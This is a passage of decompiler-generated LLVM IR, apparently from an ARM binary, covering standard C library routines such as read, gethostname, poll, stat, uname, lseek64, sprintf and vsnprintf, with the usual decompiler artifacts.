  uselistorder label %dec_label_pc_139bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13968, { 1, 0 }
  uselistorder label %dec_label_pc_137e8, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13a50 = load i32, i32* @r1, align 4
  %v2_13a50 = icmp eq i32 %v0_13a50, 0
  %v3_13a54 = load i32, i32* @r4, align 4
  store i32 %v3_13a54, i32* %stack_var_-8, align 4
  %v0_13a58 = load i32, i32* @r0, align 4
  store i32 %v0_13a58, i32* %r4.global-to-local, align 4
  br i1 %v2_13a50, label %dec_label_pc_13a7c, label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %entry
  %v1_13a68 = add i32 %v0_13a58, 260
  %v4_13a6c = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_13a68)
  %v2_13a70 = icmp eq i32 %v4_13a6c, 0
  br i1 %v2_13a70, label %dec_label_pc_13a80, label %dec_label_pc_13a7c

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a60, %entry
  br label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a60, %dec_label_pc_13a7c
  %storemerge = phi i32 [ 0, %dec_label_pc_13a7c ], [ 1, %dec_label_pc_13a60 ]
  %v1_13a84 = load i32, i32* %r4.global-to-local, align 4
  %v2_13a84 = add i32 %v1_13a84, 256
  %v3_13a84 = inttoptr i32 %v2_13a84 to i32*
  store i32 %storemerge, i32* %v3_13a84, align 4
  %v2_13a88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13a88, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_13a80, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_13aa4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13aa4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13aa4 = load i32, i32* @r0, align 4
  ret i32 %v2_13aa4

bb1:                                              ; preds = %entry
  %v0_13aa8 = call i32 @__syscall_error()
  ret i32 %v0_13aa8
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13ab4 = load i32, i32* @global_var_255f0.254, align 4
  %v2_13ab8 = icmp eq i32 %v3_13ab4, 0
  br i1 %v2_13ab8, label %dec_label_pc_13ac0, label %entry.dec_label_pc_13adc_crit_edge

entry.dec_label_pc_13adc_crit_edge:               ; preds = %entry
  %v3_13adc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13adc

dec_label_pc_13ac0:                               ; preds = %entry
  %v0_13ac0 = load i32, i32* @r7, align 4
  store i32 %v0_13ac0, i32* @ip, align 4
  %v0_13ad0 = load i32, i32* @r0, align 4
  %v2_13ad0 = icmp ugt i32 %v0_13ad0, -4097
  br i1 %v2_13ad0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_13adc, %dec_label_pc_13ac0
  %merge = phi i32 [ %v0_13ad0, %dec_label_pc_13ac0 ], [ %v0_13b00, %dec_label_pc_13adc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_13ac0
  %v0_13ad8 = call i32 @__syscall_error()
  br label %dec_label_pc_13adc

dec_label_pc_13adc:                               ; preds = %entry.dec_label_pc_13adc_crit_edge, %bb8
  %v3_13adc = phi i32 [ %v3_13adc.pre, %entry.dec_label_pc_13adc_crit_edge ], [ %v0_13ad8, %bb8 ]
  store i32 %v3_13adc, i32* %stack_var_-24, align 4
  %v6_13adc = load i32, i32* @r1, align 4
  %v15_13adc = load i32, i32* @r7, align 4
  store i32 %v15_13adc, i32* %stack_var_-8, align 4
  %v18_13adc = load i32, i32* @lr, align 4
  %v0_13ae0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13ae0, i32* @ip, align 4
  %v2_13ae8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_13adc, i32* @r1, align 4
  store i32 %v2_13ae8, i32* @r7, align 4
  %v1_13afc = call i32 @__libc_disable_asynccancel(i32 %v0_13ae0)
  %v0_13b00 = load i32, i32* @r7, align 4
  store i32 %v0_13b00, i32* @r0, align 4
  %v2_13b04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13b04, i32* @r7, align 4
  store i32 %v18_13adc, i32* @lr, align 4
  %v2_13b08 = icmp ugt i32 %v0_13b00, -4097
  br i1 %v2_13b08, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_13adc
  %v0_13b10 = call i32 @__syscall_error()
  ret i32 %v0_13b10

; uselistorder directives
  uselistorder i32 %v0_13b00, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 8, 7, 11, 1, 0, 6, 3, 2, 10, 5, 4, 9 }
  uselistorder label %dec_label_pc_13adc, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_13b2c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_13b38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13b38, i32* %r5.global-to-local, align 4
  %v1_13b3c = call i32 @uname(i32 %v2_13b2c)
  %v7_13b40 = icmp eq i32 %v1_13b3c, -1
  br i1 %v7_13b40, label %bb, label %dec_label_pc_13b4c

bb:                                               ; preds = %entry
  store i32 %v1_13b3c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b4c:                               ; preds = %entry
  %v2_13b4c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_13b54 = call i32 @strlen(i8* %tmp10)
  %v1_13b58 = add i32 %v3_13b54, 1
  %v1_13b5c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13b58, %v1_13b5c
  br i1 %tmp, label %dec_label_pc_13b64, label %dec_label_pc_13b80

dec_label_pc_13b64:                               ; preds = %dec_label_pc_13b4c
  %v0_13b68 = call i32 @__aeabi_read_tp()
  %v3_13b6c = load i16, i16* @global_var_222f0.75, align 2
  %v4_13b6c = sext i16 %v3_13b6c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13b78 = add i32 %v4_13b6c, %v0_13b68
  %v4_13b78 = inttoptr i32 %v3_13b78 to i32*
  store i32 22, i32* %v4_13b78, align 4
  %v0_13b90.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b80:                               ; preds = %dec_label_pc_13b4c
  store i32 %v2_13b4c, i32* @r1, align 4
  %v0_13b84 = load i32, i32* %r6.global-to-local, align 4
  %v2_13b88 = inttoptr i32 %v0_13b84 to i8*
  %v3_13b88 = call i32 @strcpy(i8* %v2_13b88, i32 %v2_13b4c)
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %bb, %dec_label_pc_13b64, %dec_label_pc_13b80
  %v0_13b90 = phi i32 [ %v1_13b3c, %bb ], [ %v0_13b90.pre, %dec_label_pc_13b64 ], [ 0, %dec_label_pc_13b80 ]
  ret i32 %v0_13b90

; uselistorder directives
  uselistorder i32 %v2_13b4c, { 1, 0 }
  uselistorder i32 %v1_13b3c, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_13b90, { 2, 1, 0 }
}

define i32 @__syscall_poll() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ba4 = load i32, i32* @r7, align 4
  store i32 %v3_13ba4, i32* %stack_var_-8, align 4
  %v0_13bb0 = load i32, i32* @r0, align 4
  store i32 %v0_13bb0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13bb0, -4095
  br i1 %tmp, label %dec_label_pc_13bd8, label %dec_label_pc_13bc0

dec_label_pc_13bc0:                               ; preds = %entry
  %v0_13bc4 = call i32 @__aeabi_read_tp()
  %v3_13bc8 = load i16, i16* @global_var_222f0.75, align 2
  %v4_13bc8 = sext i16 %v3_13bc8 to i32
  %v0_13bcc = load i32, i32* %r2.global-to-local, align 4
  %v1_13bcc = sub i32 0, %v0_13bcc
  store i32 %v1_13bcc, i32* %r2.global-to-local, align 4
  %v3_13bd0 = add i32 %v4_13bc8, %v0_13bc4
  %v4_13bd0 = inttoptr i32 %v3_13bd0 to i32*
  store i32 %v1_13bcc, i32* %v4_13bd0, align 4
  %v2_13bd8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %entry, %dec_label_pc_13bc0
  %v1_13bdc = phi i32 [ %v0_13bb0, %entry ], [ -1, %dec_label_pc_13bc0 ]
  %v2_13bd8 = phi i32 [ %v3_13ba4, %entry ], [ %v2_13bd8.pre, %dec_label_pc_13bc0 ]
  store i32 %v2_13bd8, i32* @r7, align 4
  ret i32 %v1_13bdc

; uselistorder directives
  uselistorder i32 %v0_13bb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bd8, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13be8 = load i32, i32* @r4, align 4
  store i32 %v3_13be8, i32* %stack_var_-20, align 4
  %v6_13be8 = load i32, i32* @r5, align 4
  %v9_13be8 = load i32, i32* @r6, align 4
  %v12_13be8 = load i32, i32* @r7, align 4
  %v4_13bf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_13bf8 = icmp eq i32 %v4_13bf4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_13bf8, label %dec_label_pc_13c10, label %entry.dec_label_pc_13c1c_crit_edge

entry.dec_label_pc_13c1c_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13c1c

dec_label_pc_13c10:                               ; preds = %entry
  store i32 %v3_13be8, i32* @r4, align 4
  store i32 %v9_13be8, i32* @r6, align 4
  store i32 %v12_13be8, i32* @r7, align 4
  %v0_13c18 = call i32 @__syscall_poll()
  br label %dec_label_pc_13c1c

dec_label_pc_13c1c:                               ; preds = %entry.dec_label_pc_13c1c_crit_edge, %dec_label_pc_13c10
  %v0_13c1c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13c1c, i32* @r5, align 4
  %v0_13c2c = load i32, i32* @r4, align 4
  store i32 %v0_13c2c, i32* @r0, align 4
  %v0_13c30 = call i32 @__syscall_poll()
  store i32 %v0_13c30, i32* @r4, align 4
  %v0_13c38 = load i32, i32* @r5, align 4
  %v1_13c3c = call i32 @__libc_disable_asynccancel(i32 %v0_13c38)
  %v0_13c40 = load i32, i32* @r4, align 4
  %v2_13c48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13c48, i32* @r4, align 4
  store i32 %v6_13be8, i32* @r5, align 4
  store i32 %v9_13be8, i32* @r6, align 4
  store i32 %v12_13be8, i32* @r7, align 4
  ret i32 %v0_13c40

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 10, 9, 2, 1, 3, 8, 7, 5, 6, 11, 4, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 10, 9, 2, 1, 3, 8, 7, 5, 6, 11, 4, 0 }
  uselistorder label %dec_label_pc_13c1c, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 195, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13c98, label %dec_label_pc_13c7c

dec_label_pc_13c7c:                               ; preds = %entry
  %v0_13c80 = call i32 @__aeabi_read_tp()
  %v3_13c84 = load i16, i16* @global_var_222f0.75, align 2
  %v4_13c84 = sext i16 %v3_13c84 to i32
  %v0_13c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c88 = sub i32 0, %v0_13c88
  store i32 %v1_13c88, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_13c90 = add i32 %v4_13c84, %v0_13c80
  %v4_13c90 = inttoptr i32 %v3_13c90 to i32*
  store i32 %v1_13c88, i32* %v4_13c90, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_13c98:                               ; preds = %entry
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v2_13c98 = icmp eq i32 %arg1, 0
  br i1 %v2_13c98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c98
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c98, %bb
  call void @__pseudo_cond_branch(i1 %v2_13c98, i32 ptrtoint (i32* @global_var_11ba8.439 to i32))
  br label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c7c, %.thread
  %v0_13ca8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_13ca8

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13ca8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13cbc = load i32, i32* @r7, align 4
  store i32 %v3_13cbc, i32* %stack_var_-8, align 4
  %v0_13cc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13cc8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13cc8, -4095
  br i1 %tmp, label %dec_label_pc_13cf0, label %dec_label_pc_13cd8

dec_label_pc_13cd8:                               ; preds = %entry
  %v0_13cdc = call i32 @__aeabi_read_tp()
  %v3_13ce0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_13ce0 = sext i16 %v3_13ce0 to i32
  %v0_13ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ce4 = sub i32 0, %v0_13ce4
  store i32 %v1_13ce4, i32* %r2.global-to-local, align 4
  %v3_13ce8 = add i32 %v4_13ce0, %v0_13cdc
  %v4_13ce8 = inttoptr i32 %v3_13ce8 to i32*
  store i32 %v1_13ce4, i32* %v4_13ce8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13cf0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13cf0

dec_label_pc_13cf0:                               ; preds = %entry, %dec_label_pc_13cd8
  %v1_13cf4 = phi i32 [ %v0_13cc8, %entry ], [ -1, %dec_label_pc_13cd8 ]
  %v2_13cf0 = phi i32 [ %v3_13cbc, %entry ], [ %v2_13cf0.pre, %dec_label_pc_13cd8 ]
  store i32 %v2_13cf0, i32* @r7, align 4
  ret i32 %v1_13cf4

; uselistorder directives
  uselistorder i32 %v0_13cc8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13cf0, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_13d44, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %entry
  %v0_13d2c = call i32 @__aeabi_read_tp()
  %v3_13d30 = load i16, i16* @global_var_222f0.75, align 2
  %v4_13d30 = sext i16 %v3_13d30 to i32
  %v0_13d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d34 = sub i32 0, %v0_13d34
  store i32 %v1_13d34, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13d3c = add i32 %v4_13d30, %v0_13d2c
  %v4_13d3c = inttoptr i32 %v3_13d3c to i32*
  store i32 %v1_13d34, i32* %v4_13d3c, align 4
  %v0_13d4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13d4c

dec_label_pc_13d44:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_13d44 = icmp eq i32 %arg1, 0
  br i1 %v2_13d44, label %dec_label_pc_13d58, label %dec_label_pc_13d4c

dec_label_pc_13d4c:                               ; preds = %dec_label_pc_13d44, %dec_label_pc_13d28
  %v0_13d4c = phi i32 [ %arg1, %dec_label_pc_13d44 ], [ %v0_13d4c.pre, %dec_label_pc_13d28 ]
  %v3_13d50 = ashr i32 %v0_13d4c, 31
  br label %dec_label_pc_13d5c

dec_label_pc_13d58:                               ; preds = %dec_label_pc_13d44
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d4c, %dec_label_pc_13d58
  %v1_13d64 = phi i32 [ %v0_13d4c, %dec_label_pc_13d4c ], [ %tmp8, %dec_label_pc_13d58 ]
  %storemerge = phi i32 [ %v3_13d50, %dec_label_pc_13d4c ], [ %tmp, %dec_label_pc_13d58 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_13d64

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 4, 0, 1, 3 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_13d5c, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_13d78 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13d78, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_13d8c = call i32 @__GI_vsnprintf()
  ret i32 %v0_13d8c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %v3_13da0 = load i32, i32* @r4, align 4
  %v6_13da0 = load i32, i32* @r5, align 4
  %v9_13da0 = load i32, i32* @r6, align 4
  %v2_13db4 = ptrtoint i32* %stack_var_-96 to i32
  %v0_13db8 = load i32, i32* @r0, align 4
  store i32 %v0_13db8, i32* @r4, align 4
  %v0_13dbc = load i32, i32* @r2, align 4
  %v0_13dc0 = load i32, i32* @r1, align 4
  store i32 %v0_13dc0, i32* @r5, align 4
  %v1_13dd8 = sub i32 -1, %v0_13db8
  store i32 %v1_13dd8, i32* @lr, align 4
  %v0_13ddc = load i32, i32* @r3, align 4
  store i32 %v0_13ddc, i32* @r2, align 4
  %v3_13de4 = icmp ult i32 %v0_13dc0, %v1_13dd8
  br i1 %v3_13de4, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_13dd8, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_13df4 = phi i32 [ %v0_13dc0, %entry ], [ %v1_13dd8, %bb ]
  %v2_13df4 = add i32 %v1_13df4, %v0_13db8
  store i32 %v2_13df4, i32* @ip, align 4
  store i32 0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_13e34 = inttoptr i32 %v0_13dbc to i8*
  %v3_13e34 = call i32 @_vfprintf_internal(i32 %v2_13db4, i8* %v2_13e34)
  %v0_13e38 = load i32, i32* @r5, align 4
  %v1_13e38 = load i32, i32* @r6, align 4
  %v9_13e38 = icmp eq i32 %v0_13e38, %v1_13e38
  br i1 %v9_13e38, label %dec_label_pc_13e5c, label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %bb26
  %v9_13e48 = icmp eq i32 %v1_13df4, 0
  br i1 %v9_13e48, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_13e40
  %v2_13e4c = add i32 %v0_13db8, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13e40, %bb27
  %v1_13e50 = phi i32 [ %v2_13df4, %dec_label_pc_13e40 ], [ %v2_13e4c, %bb27 ]
  %v1_13e50.v0_13e2c = select i1 %v9_13e48, i32 %v1_13e50, i32 %v0_13db8
  %stack_var_-80.0 = inttoptr i32 %v1_13e50.v0_13e2c to i8*
  %v1_13e58 = trunc i32 %v1_13e38 to i8
  store i8 %v1_13e58, i8* %stack_var_-80.0, align 1
  br label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %bb26, %bb28
  store i32 %v3_13da0, i32* @r4, align 4
  store i32 %v6_13da0, i32* @r5, align 4
  store i32 %v9_13da0, i32* @r6, align 4
  ret i32 %v3_13e34

; uselistorder directives
  uselistorder i1 %v9_13e48, { 1, 0 }
  uselistorder i32 %v1_13df4, { 1, 0 }
  uselistorder i32 %v1_13dd8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13db8, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_13e5c, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_13e70 = load i32, i32* @r4, align 4
  %v6_13e70 = load i32, i32* @r5, align 4
  %v9_13e70 = load i32, i32* @r6, align 4
  %v12_13e70 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_13e7c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_13e7c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_13e942 = icmp eq i32 %arg3, 0
  br i1 %v2_13e942, label %dec_label_pc_13eb4, label %dec_label_pc_13ea8

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13ea8
  %v1_13e90 = add i32 %v0_13e90, -1
  store i32 %v1_13e90, i32* @r4, align 4
  %v2_13e94 = icmp eq i32 %v1_13e90, 0
  %v0_13ea0 = load i32, i32* @r7, align 4
  br i1 %v2_13e94, label %dec_label_pc_13eb4.loopexit, label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %entry, %dec_label_pc_13e90
  %v0_13ea04 = phi i32 [ %v0_13ea0, %dec_label_pc_13e90 ], [ %arg1, %entry ]
  %v3_13ea8 = inttoptr i32 %v0_13ea04 to i16*
  %v4_13ea8 = call i32 @__stdio_fwrite(i32 %v10_13e7c, i32 1, i16* %v3_13ea8)
  %v7_13eac = icmp eq i32 %v4_13ea8, 1
  %v0_13e90 = load i32, i32* @r4, align 4
  br i1 %v7_13eac, label %dec_label_pc_13e90, label %dec_label_pc_13eb4.loopexit

dec_label_pc_13eb4.loopexit:                      ; preds = %dec_label_pc_13e90, %dec_label_pc_13ea8
  %v0_13eb4.ph = phi i32 [ %v0_13e90, %dec_label_pc_13ea8 ], [ 0, %dec_label_pc_13e90 ]
  %v1_13eb4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13eb4

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13eb4.loopexit, %entry
  %v1_13eb4 = phi i32 [ 0, %entry ], [ %v1_13eb4.pre, %dec_label_pc_13eb4.loopexit ]
  %v0_13eb4 = phi i32 [ 0, %entry ], [ %v0_13eb4.ph, %dec_label_pc_13eb4.loopexit ]
  %v2_13eb4 = sub i32 %v1_13eb4, %v0_13eb4
  store i32 %v3_13e70, i32* @r4, align 4
  store i32 %v6_13e70, i32* @r5, align 4
  store i32 %v9_13e70, i32* @r6, align 4
  store i32 %v12_13e70, i32* @r7, align 4
  ret i32 %v2_13eb4

; uselistorder directives
  uselistorder i32 %v1_13e90, { 1, 0 }
  uselistorder label %dec_label_pc_13eb4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_13ea8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13ec4 = load i32, i32* @r4, align 4
  store i32 %v3_13ec4, i32* %stack_var_-24, align 4
  %v6_13ec4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_13ecc = and i32 %arg2, 128
  %v2_13ecc = icmp eq i32 %v1_13ecc, 0
  %v0_13ed0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13ed0, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_13ecc, label %dec_label_pc_13f20thread-pre-split, label %dec_label_pc_13ee4

dec_label_pc_13ee4:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_13ee8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_13ee8, i32* %r0.global-to-local, align 4
  %v1_13eec = load i32, i32* %r4.global-to-local, align 4
  %v2_13eec = sub i32 %v1_13eec, %v3_13ee8
  store i32 %v2_13eec, i32* @r4, align 4
  store i32 %v3_13ee8, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_13eec, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_13f00

.thread:                                          ; preds = %dec_label_pc_13ee4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f1c

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13ee4
  %v0_13f00 = load i32, i32* @r5, align 4
  %v1_13f00 = urem i32 %v0_13f00, 128
  %v0_13f04 = load i32, i32* @r8, align 4
  store i32 %v0_13f04, i32* %r0.global-to-local, align 4
  %v3_13f0c = trunc i32 %v1_13f00 to i8
  %v4_13f0c = call i32 @_charpad(i32 %v0_13f04, i8 %v3_13f0c, i32 %v2_13eec)
  store i32 %v4_13f0c, i32* %r0.global-to-local, align 4
  %v1_13f10 = load i32, i32* @r4, align 4
  %v9_13f10 = icmp eq i32 %v4_13f0c, %v1_13f10
  store i32 %v4_13f0c, i32* %r5.global-to-local, align 4
  br i1 %v9_13f10, label %dec_label_pc_13f00.dec_label_pc_13f1c_crit_edge, label %dec_label_pc_13f3c

dec_label_pc_13f00.dec_label_pc_13f1c_crit_edge:  ; preds = %dec_label_pc_13f00
  %v0_13f1c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13f1c

dec_label_pc_13f1c:                               ; preds = %.thread, %dec_label_pc_13f00.dec_label_pc_13f1c_crit_edge
  %v0_13f1c = phi i32 [ %v0_13f1c.pre, %dec_label_pc_13f00.dec_label_pc_13f1c_crit_edge ], [ %v3_13ee8, %.thread ]
  store i32 %v0_13f1c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f20thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f20thread-pre-split, %dec_label_pc_13f1c
  %v5_13f2c = phi i32 [ %arg3, %dec_label_pc_13f20thread-pre-split ], [ %v0_13f1c, %dec_label_pc_13f1c ]
  %tmp14 = icmp slt i32 %v5_13f2c, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_13f20
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13f20
  %v5_13f28 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_13f28, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_15740.527 to i32))
  %v0_13f38 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f38 = add i32 %storemerge, %v0_13f38
  store i32 %v2_13f38, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f00, %bb15
